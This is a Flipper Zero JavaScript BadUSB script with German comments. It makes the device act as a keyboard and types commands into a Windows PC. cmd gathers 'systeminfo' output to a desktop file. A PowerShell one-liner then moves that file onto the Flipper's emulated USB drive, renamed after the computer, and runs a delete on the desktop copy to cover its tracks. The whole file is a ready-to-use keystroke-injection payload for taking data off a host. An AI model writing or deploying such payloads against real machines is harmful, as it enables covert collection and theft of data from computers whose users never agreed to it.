//
//Version 1.1
//Author: Christian Böö
//
//Dieses Script sammelt Systeminformationen und speichert sie als txt-File auf dem Flipper Zero USB-Stick
//

//Requirements
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");
let dialog = require("dialog");
//Infos zum USB-Image
let image = "/ext/apps_data/mass_storage/Cb.img";
let size = 8 * 1024 * 1024; // 8 MB
//Tastaturspracheinstellungen
//ACHTUNG MUSS ZU DEN PC EINSTELLUNGEN PASSEN
let layout = "de-DE";

// Check ob Image vorhanden
print("Suche Image Datei...");
if (storage.exists(image)) {
    print("Datei existiert.");
} else {
    print("Image erstellen...");
    usbdisk.createImage(image, size);
}

// BadUSB-verbindung herstellen mit dem unter "layout" definierten Layout
badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl" });
print("Warte auf verbindung....");
while (!badusb.isConnected()) {
    delay(1000);
}

dialog.message("Systeminfos lesen", "OK zum Starten");

//Ausführen öffnen
print ("Ausfuehren oeffnen...");
badusb.press("GUI","r");
delay(500);

//cmd eingeben - println führt automatisch Enter aus
print ("CMD tippen...");
badusb.println("cmd");
delay(500);

//zum Desktop wechseln
print ("zum Desktop....");
badusb.println("cd Desktop");
delay (500);

//systeminfo ausführen und in sysinfo.txt schreiben
print ("Infos sammeln.....");
badusb.println("systeminfo > sysinfo.txt");
delay (3000);

//cmd schließen
print ("CMD schlieszen.....");
badusb.press("ALT","F4");
delay (500);

//powershell öffnen
print ("Powershell oeffnen....");
badusb.press("GUI","r");
delay (500);
badusb.println("powershell");
delay (500);
//powershell wartet jetzt 30 sekunden bis flipper usb-stick geladen wurde und ermittelt den Laufwerksbuchstaben - kopiert die sysinfo.txt vom Desktop auf den Stick und löscht sie anschließend vom Desktop
//wir müssen hier den badusb trennen und den stick verbinden
badusb.println("Start-Sleep 30; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; Move-Item -Path C:\\Users\\${env:username}\\Desktop\\sysinfo.txt -Destination ${DriveLetter}:\\${env:computername}_sysinfo.txt; Remove-Item C:\\Users\\${env:username}\\Desktop\\sysinfo.txt; exit");
badusb.quit();
print ("Bad-USB trennen....");
delay (2000);
usbdisk.start(image);
print ("USB-Stick laden....");
print ("Wenn Powershell geschlossen wurde, USB bitte auswerfen lassen.....");

while (!usbdisk.wasEjected()) {
    delay(1000);
}

// Stop
usbdisk.stop();
print("Fertig!");